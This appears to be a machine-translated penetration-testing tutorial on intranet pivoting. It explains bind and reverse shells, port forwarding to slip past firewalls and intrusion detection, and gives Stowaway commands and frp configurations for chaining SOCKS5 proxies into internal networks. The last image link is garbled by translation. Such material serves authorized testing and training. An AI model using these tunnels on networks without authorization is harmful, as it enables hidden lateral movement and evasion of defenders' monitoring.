# Intranet proxy and port forwarding

# Port Forwarding and Proxy

## Forward and reverse connections

Forward connection is the process of the controlled host listening to a port and controlling the host to actively connect to the controlled host. It is suitable for the case where the controlled host has a public network `IP`, such as the `Bind Shell` represented by `windows/meterpreter/bind_tcp` in Metasploit`.

The reverse proxy is the process of the control host listening to a port and the controlled host is reversely connected to the control host. It is suitable for the controlled host without a public IP, such as the `Reverse Shell` represented by `windows/meterpreter/reverse_tcp` in Metasploit`.

In actual offense and defense, forward connections are often limited by problems such as firewall blocking or insufficient permissions on the charged host, while reverse connections can avoid these problems well and break through restrictions.

![Untitled](%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%20ee2c487a05274d05b061aaf6b4b41cbe/Untitled.png)

## Port Forwarding

Port forwarding is an application of network address translation. Through port forwarding, data received on one network port can be forwarded to another network port. The forwarding port can be the port of the local machine or the port on other hosts.

In actual offense and defense, various firewalls and intrusion detection devices deployed in the intranet will detect connections on sensitive ports. If there is any abnormality in the connection, communication will be blocked immediately. Using port forwarding technology, the data of this detected sensitive port is forwarded to the port allowed by the firewall, and a communication tunnel is established to bypass the firewall to communicate with the specified port.

## Common forwarding and proxy tools

### Stowaway

`Stowaway` is a multi-level agent tool written in the `go` language and made specifically for penetration testing workers. Users can use this program to proxy external traffic to the intranet through multiple nodes, break through the intranet access restrictions, construct a tree node network, and easily implement management functions.

`Stowaway` contains two roles, namely:

- The main control end used by the `admin` penetration tester;
- `agent` is the accused end of the deployment of the penetration tester.

How to use:

- `admin`

```bash
parameter:
-l Listening address in passive mode [ip]:<port>
-s node communication encryption key, all nodes (admin&&agent) must be consistent
-c Target node address in active mode
--socks5-proxy socks5 proxy server address
--socks5-proxy socks5 proxy server username (optional)
--socks5-proxyp socks5 proxy server password (optional)
--http-proxy http proxy server address
--down downstream protocol type, default is bare TCP traffic, optional HTTP
```

- `agent`

```bash
parameter:
-l Listening address in passive mode [ip]:<port>
-s Node Communication Encryption Key
-c Target node address in active mode
--socks5-proxy socks5 proxy server address
--socks5-proxy socks5 proxy server username (optional)
--socks5-proxyp socks5 proxy server password (optional)
--http-proxy http proxy server address
--reconnect Reconnect time interval
--rehost IP address multiplexed when port multiplexing
--report The port number that is multiplexed when port multiplexing
--up Upstream protocol type, default to bare TCP traffic, optional HTTP
--down downstream protocol type, default is bare TCP traffic, optional HTTP
--CSS The shell encoding type of the running platform, default is utf-8, optional gbk
```

Actual use:

```bash
#Control side configuration
.\windows_x64_admin.exe -l "192.168.31.42:8080" -s h3rmesk1t

#Configuration of the commanded terminal
./linux_x64_agent -c 192.168.31.42:8080 -s h3rmesk1t

# Set up a first-level proxy
Detail
use 0
socks 5050

# Set up a secondary agent
# When the above agent remains unchanged, enable a listening on node 0, for example, listen to port 8081, and then the subsequent host actively connects to the host where node 0 is located
Listen
1
8081
#Configuration of the commanded terminal
./linux_x64_agent -c 192.168.52.10:8081 -s h3rmesk1t
# At this time, a new node will be added, and the socks5 proxy will be added
use 1
socks 5051

# Then configure proxy rules on Proxifier to access the second layer network
```

![Untitled](%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%20ee2c487a05274d05b061aaf6b4b41cbe/Untitled%201.png)

![Untitled](%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%20ee2c487a05274d05b061aaf6b4b41cbe/Untitled%202.png)

![Untitled](%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%20ee2c487a05274d05b061aaf6b4b41cbe/Untitled%203.png)

![Untitled](%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%20ee2c487a05274d05b061aaf6b4b41cbe/Untitled%204.png)

### Frp

Control side configuration `frps.ini`:

```bash
[common]
#The server listens to the port, default is 8080, listens to traffic requests from the client
bind_port = 8080
# You don't need to add the following
#Console Username
dashboard_user = admin
#Console Password
dashboard_pwd = password
#Console port
dashboard_port = 7500
```

Edge machine configuration `frps.ini`:

```bash
[common]
bind_port = 8081
```

Edge machine configuration `frpc.ini`:

```bash
[common]
# If tls_enable is true, frpc will connect frps through tls. Otherwise, it may not be able to run
tls_enable = true
server_addr = 192.168.31.42
server_port = 8080
#Port Forwarding
#Forward local 5050 port to server port 5050
[portforward]
type = tcp
local_ip = 127.0.0.1
remote_port = 5050
local_port = 5050
```

Intranet machine configuration `frpc.ini`:

```bash
[common]
server_addr = 192.168.52.10
server_port = 8081
[sock5]
type = tcp
plugin = socks5
remote_port = 5051
```

Execute the command:

```bash
# Execute commands on the control side
frps.exe -c frps.ini
# Edge machine executes commands
frps.exe -c frps.ini
frpc.exe -c frpc.ini
# Intranet machine executes commands
frpc.exe -c frpc.ini
```

![Untitled](%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%20ee2c487a05274d05b061aaf6b4b41cbe/Untitled%205.png)

![Untitled](%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%20ee2c487a05274d05b061aaf6b4b41cbe/Untitled%206.png)

![Untitled](%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%20ee2c487a05274d05b061aaf6b4b41cbe/Untitled%207.png)

![Untitled](%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%20ee2c487a05274d05b061aaf6b4b41cbe/Untitled%208.png)

![Untitled](%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E7%AB%AF%E5%
8F%A3%E8%BD%AC%E5%8F%91%20 Oh oh 2 from 487 ah 05274 05 not 061 ah 6 not 4 not 41 cost amount/untitled%209.PNG)